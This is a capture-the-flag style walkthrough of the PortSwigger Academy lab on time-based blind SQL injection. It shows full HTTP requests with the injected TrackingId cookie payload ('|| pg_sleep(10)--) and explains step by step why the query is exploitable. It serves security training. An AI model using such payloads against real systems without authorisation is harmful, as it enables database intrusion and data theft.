---
title: "PortSwigger Academy — Blind SQL injection with time delays (Web) Walkthrough"
---
# Blind SQL injection with time delays

```
❓

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
```

In this lab we are tasked with performing a **Time-based SQLi **of 10 seconds into the tracking cookie. I start things off with my usual testing of the categories on the store page. Below is my request containing the tracking cookie in question.

```bash
GET /filter?category=Pets HTTP/2
Host: 0a8d008b0453fc1cd5a27fd100b300d1.web-security-academy.net
Cookie: TrackingId=Q09xtaKSV7Nj0zrZ; session=uG7fjFy7G6lGJdMS5veUvxz5aU6O8Rwh
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8d008b0453fc1cd5a27fd100b300d1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

We will have to try out different payloads to figure out which database language the server is using, after testing the payloads on the [Portswigger cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), I found that PostgreSQL works. We will have to concatenate the sleep function to the end of the `TrackingId` cookie like so.

```bash
GET /filter?category=Pets HTTP/2
Host: 0a670013040e6bee82a3295b009b0073.web-security-academy.net
Cookie: TrackingId=dvSmBbqRNbGP1odD'|| pg_sleep(10)--; session=mDOdNGJTp6gz8pLqkNqiUMtz9zymOiOX
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a670013040e6bee82a3295b009b0073.web-security-academy.net/filter?category=Pets
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

### **The Vulnerable Query**

Let's assume the application uses the following SQL query to process the `TrackingId` cookie value:

```sql
SELECT * FROM tracking WHERE id = 'dvSmBbqRNbGP1odD';

```

The attacker modifies the `TrackingId` cookie value to include:

```sql
Q09xtaKSV7Nj0zrZ'||pg_sleep(10)--

```

The new query becomes:

```sql
SELECT * FROM tracking WHERE id = 'dvSmBbqRNbGP1odD'||pg_sleep(10)--';

```

---

### **Breaking it Down**

### **1. String Concatenation (****`||`****):**

- The **`||`** operator concatenates the string `dvSmBbqRNbGP1odD` with the result of `pg_sleep(10)`.
- This concatenation is used to force the database to process the **`pg_sleep(10)`** function giving the attacker confirmation that the `TrackingId` cookie is in fact vulnerable to SQLi.

### **2. ****`pg_sleep(10)`**** Function:**

- This function instructs the database (PostgreSQL, in this case) to **pause execution for 10 seconds**.
- This is often used in **blind SQL injection** to measure the delay and confirm whether the query was executed.

### **3. SQL Comment (****`--`****):**

- The `--` is used to comment out the remainder of the query. Anything after `--` is ignored by the database.
- This ensures the query is syntactically valid and doesn't break after the injected payload.

---

### **Why Is This Vulnerable?**

The application does not sanitize or validate the input in the `TrackingId` cookie before including it in the SQL query. This allows the attacker to inject arbitrary SQL code.

---

### **What Happens During Execution?**

1. The database processes the concatenation with **`||`**.
2. The **`pg_sleep(10)`** function is executed, delaying the response by 10 seconds.
3. The attacker observes the delay, confirming that the payload was executed.

---
